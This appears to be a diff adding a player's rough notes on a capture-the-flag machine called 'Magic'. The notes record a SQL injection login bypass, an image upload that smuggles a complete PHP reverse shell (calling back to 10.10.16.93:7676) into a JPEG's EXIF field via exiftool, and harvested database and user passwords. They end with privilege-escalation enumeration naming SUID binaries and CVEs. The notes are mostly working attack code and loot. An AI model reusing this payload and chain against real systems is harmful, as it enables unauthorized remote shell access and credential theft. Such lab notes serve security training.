@@ -1,0 +1,68 @@
+/assets (Status: 301)
+/images (Status: 301)
+/index.php (Status: 200)
+/login.php (Status: 200)
+/logout.php (Status: 302)
+/upload.php (Status: 302)
+
+
+* I can log in using an sqli (' or 1=1 --) on both username and password *
+WHY?
+
+* Managed to upload an image to /images/uploads/my_file_name *
+
+* Used exiftool to hide php code in a jpeg's exif header *
+
+exiftool -DocumentName='<?php set_time_limit (0);$VERSION = "1.0";$ip = "10.10.16.93";  $port = 7676;       $chunk_size = 1400;$write_a = null;$error_a = null;$shell = "uname -a; w; id; /bin/sh -i";$daemon = 0;$debug = 0;if (function_exists("pcntl_fork")) {	$pid = pcntl_fork();		if ($pid == -1) {		printit("ERROR: Cant fork");		exit(1);	}		if ($pid) {		exit(0); 	}		if (posix_setsid() == -1) {		printit("Error: Cant setsid()");		exit(1);	}	$daemon = 1;} else {	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");}chdir("/");umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) {	printit("$errstr ($errno)");	exit(1);}$descriptorspec = array(   0 => array("pipe", "r"),     1 => array("pipe", "w"),     2 => array("pipe", "w")   );$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) {	printit("ERROR: Cant spawn shell");	exit(1);}stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit("Successfully opened reverse shell to $ip:$port");while (1) {	if (feof($sock)) {		printit("ERROR: Shell connection terminated");		break;	}	if (feof($pipes[1])) {		printit("ERROR: Shell process terminated");		break;	}	$read_a = array($sock, $pipes[1], $pipes[2]);	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);	if (in_array($sock, $read_a)) {		if ($debug) printit("SOCK READ");		$input = fread($sock, $chunk_size);		if ($debug) printit("SOCK: $input");		fwrite($pipes[0], $input);	}	if (in_array($pipes[1], $read_a)) {		if ($debug) printit("STDOUT READ");		$input = fread($pipes[1], $chunk_size);		if ($debug) printit("STDOUT: $input");		fwrite($sock, $input);	}	if (in_array($pipes[2], $read_a)) {		if ($debug) printit("STDERR READ");		$input = fread($pipes[2], $chunk_size);		if ($debug) printit("STDERR: $input");		fwrite($sock, $input);	}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit ($string) {	if (!$daemon) {		print "$stringn";	}}?>' my_image.jpeg
+
+* Requesting the the page that the image is uploaded make a reverse shell back to us *
+
+
+* On vars/www/Magic/db.php5 credentials for mysql *
+private static $dbName = 'Magic' ;
+private static $dbHost = 'localhost' ;
+private static $dbUsername = 'theseus';
+private static $dbUserPassword = 'iamkingtheseus';
+
+
+* I created a small php file (dig_db.php) that connected to mysql because i could not connect from the terminal,
+then looking through the tables i found *
+
+id: 1
+username: admin
+password: Th3s3usW4sK1ng
+
+
+* Using the password with "Th3s3usW4sK1ng" with user "theseus" logs me in *  
+
+Check
+
+/usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
+
+
+? What is this ?
+usr/bin/whoopsie
+
+/etc/cron.d:
+-rw-r--r--   1 root root   191 Oct 15  2019 popularity-contest
+
+Possible private SSH keys were found!
+/etc/ImageMagick-6/mime.xml
+
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+
+
+usr/sbin/pppd		--->	Apple_Mac_OSX_10.4.8(05-2007)
+/usr/bin/newgrp		--->	HP-UX_10.20
+/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/usr/bin/chfn		--->	SuSE_9.3/10
+
+/usr/bin/sudo		--->	/sudo$
+/usr/bin/pkexec		--->	Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+
+
+[+] Readable files belonging to root and readable by me but not world readable
+-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
